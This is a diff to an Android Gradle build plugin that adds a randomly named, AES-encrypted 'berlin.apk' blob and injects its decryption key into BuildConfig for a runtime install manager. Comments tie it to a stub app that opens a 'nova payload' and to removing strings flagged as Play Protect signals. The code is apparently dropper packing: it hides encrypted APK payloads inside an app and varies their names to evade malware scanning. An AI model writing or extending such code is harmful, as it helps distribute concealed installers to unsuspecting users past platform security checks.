@@ -40,6 +40,28 @@ class FingerprintPlugin implements Plugin<Project> {
         def assetABytes = new byte[4]; rng.nextBytes(assetABytes)
         def assetAName  = bytesToHex(assetABytes) + ".bin"  // e.g. "f7b1e405.bin"
 
+        // Step 5 — Random 8-char hex asset name for berlin.apk (ASSET_C)
+        // If -Pberlin.assetC is passed (CI pipeline), use it — else generate fresh random.
+        def assetCName
+        if (project.hasProperty("berlin.assetC") && project.property("berlin.assetC")) {
+            assetCName = project.property("berlin.assetC")
+            project.logger.lifecycle("[FingerprintPlugin] ✅ ASSET_C (override) : ${assetCName}")
+        } else {
+            def assetCBytes = new byte[4]; rng.nextBytes(assetCBytes)
+            assetCName = bytesToHex(assetCBytes) + ".bin"
+        }
+
+        // Step 6 — AES-256 key for berlin blob decryption (BERLIN_KEY)
+        // If -Pberlin.berlinKey is passed (CI pipeline), use it — else generate fresh random.
+        def berlinKeyHex
+        if (project.hasProperty("berlin.berlinKey") && project.property("berlin.berlinKey")) {
+            berlinKeyHex = project.property("berlin.berlinKey")
+            project.logger.lifecycle("[FingerprintPlugin] ✅ BERLIN_KEY (override) : ${berlinKeyHex.take(16)}...")
+        } else {
+            def berlinKeyGen = KeyGenerator.getInstance("AES"); berlinKeyGen.init(256, rng)
+            berlinKeyHex = bytesToHex(berlinKeyGen.generateKey().encoded)
+        }
+
         project.ext.fp_buildUUID      = buildUUID
         project.ext.fp_saltHex        = saltHex
         project.ext.fp_aesKeyHex      = aesKeyHex
@@ -54,12 +76,16 @@ class FingerprintPlugin implements Plugin<Project> {
         project.ext.fp_blake3         = blake3hex
         project.ext.fp_assetB         = assetBName
         project.ext.fp_assetA         = assetAName
+        project.ext.fp_assetC         = assetCName
+        project.ext.fp_berlinKeyHex   = berlinKeyHex
 
         project.logger.lifecycle("[FingerprintPlugin] ✅ Fingerprint: ${buildUUID} | ${buildTimestamp}")
         project.logger.lifecycle("[FingerprintPlugin] ✅ SHA-512 : ${sha512hex.take(32)}...")
         project.logger.lifecycle("[FingerprintPlugin] ✅ BLAKE3  : ${blake3hex.take(32)}...")
         project.logger.lifecycle("[FingerprintPlugin] ✅ ASSET_B : ${assetBName}")
         project.logger.lifecycle("[FingerprintPlugin] ✅ ASSET_A : ${assetAName}")
+        project.logger.lifecycle("[FingerprintPlugin] ✅ ASSET_C : ${assetCName}")
+        project.logger.lifecycle("[FingerprintPlugin] ✅ BERLIN_KEY : ${berlinKeyHex.take(16)}...")
 
         // Inject ASSET_B into BuildConfig — StubApp.kt uses this to open the payload blob
         project.android.defaultConfig.buildConfigField(
@@ -70,6 +96,18 @@ class FingerprintPlugin implements Plugin<Project> {
         // Step 4: replaces hardcoded "companion.apk" string (GPP signal #1)
         project.android.defaultConfig.buildConfigField(
             "String", "ASSET_A", "\"${assetAName}\""
+        )
+
+        // Inject ASSET_C into BuildConfig — BerlinInstallManager.kt uses this to open the berlin blob
+        // Dedicated berlin pipeline — separate from ASSET_A (companion) and ASSET_B (nova payload)
+        project.android.defaultConfig.buildConfigField(
+            "String", "ASSET_C", "\"${assetCName}\""
+        )
+
+        // Inject BERLIN_KEY into BuildConfig — AES-256 key for berlin blob decryption at runtime
+        // encrypt_berlin_for_installer.py uses this key to encrypt the berlin APK at build time
+        project.android.defaultConfig.buildConfigField(
+            "String", "BERLIN_KEY", "\"${berlinKeyHex}\""
         )
 
         project.gradle.buildFinished {
